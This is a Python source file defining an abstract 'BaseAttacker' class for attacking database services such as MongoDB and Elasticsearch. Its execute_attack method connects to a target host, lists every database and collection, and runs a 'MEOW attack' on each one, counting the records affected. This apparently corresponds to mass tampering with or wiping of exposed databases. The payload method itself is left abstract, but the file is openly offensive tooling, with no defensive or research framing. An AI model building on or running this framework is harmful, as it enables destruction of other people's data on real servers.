from abc import ABC, abstractmethod
import logging

class BaseAttacker(ABC):
    """
    Abstract base class for all database attackers.
    """
    
    def __init__(self, host, port=None, username=None, password=None):
        """
        Initialize the base attacker with connection parameters.
        
        Args:
            host (str): Target host IP address
            port (int, optional): Target port number. If None, uses service default port.
            username (str, optional): Username for authentication
            password (str, optional): Password for authentication
        """
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.logger = logging.getLogger(__name__)
    
    @abstractmethod
    def connect(self):
        """
        Establish connection to the target database.
        Should return a connection object or raise an exception.
        """
        pass
    
    @abstractmethod
    def get_databases(self):
        """
        Get a list of available databases.
        Should return a list of database names.
        """
        pass
    
    @abstractmethod
    def get_collections(self, database):
        """
        Get a list of collections/tables for a given database.
        
        Args:
            database (str): Database name
        
        Returns:
            list: List of collection/table names
        """
        pass
    
    @abstractmethod
    def meow_data(self, database, collection):
        """
        Execute the MEOW attack on the specified collection/table.
        
        Args:
            database (str): Database name
            collection (str): Collection/table name
        
        Returns:
            int: Number of records affected
        """
        pass
    
    @abstractmethod
    def close(self):
        """
        Close all connections and clean up resources.
        """
        pass
    
    @classmethod
    @abstractmethod
    def get_service_name(cls):
        """
        Returns the service name this attacker targets.
        
        Returns:
            str: Service name (e.g., "mongodb", "elasticsearch")
        """
        pass
    
    @classmethod
    @abstractmethod
    def get_default_port(cls):
        """
        Returns the default port for this service.
        
        Returns:
            int: Default port number
        """
        pass
    
    def execute_attack(self):
        """
        Execute the full attack workflow.
        
        Returns:
            dict: Attack statistics
        """
        stats = {
            "databases_processed": 0,
            "collections_processed": 0,
            "records_affected": 0
        }
        
        try:
            # Establish connection
            connection = self.connect()
            self.logger.info(f"Successfully connected to {self.get_service_name()} at {self.host}")
            
            # Get databases
            databases = self.get_databases()
            self.logger.info(f"Found {len(databases)} databases")
            
            # Process each database
            for db_name in databases:
                self.logger.info(f"Processing database: {db_name}")
                
                # Get collections for this database
                collections = self.get_collections(db_name)
                self.logger.info(f"Found {len(collections)} collections in database {db_name}")
                
                # Process each collection
                for collection_name in collections:
                    self.logger.info(f"MEOWing collection: {collection_name}")
                    records_affected = self.meow_data(db_name, collection_name)
                    stats["records_affected"] += records_affected
                    stats["collections_processed"] += 1
                
                stats["databases_processed"] += 1
            
            # Clean up
            self.close()
            self.logger.info("Attack completed successfully")
            
        except Exception as e:
            self.logger.error(f"Attack failed: {str(e)}")
            raise
        
        return stats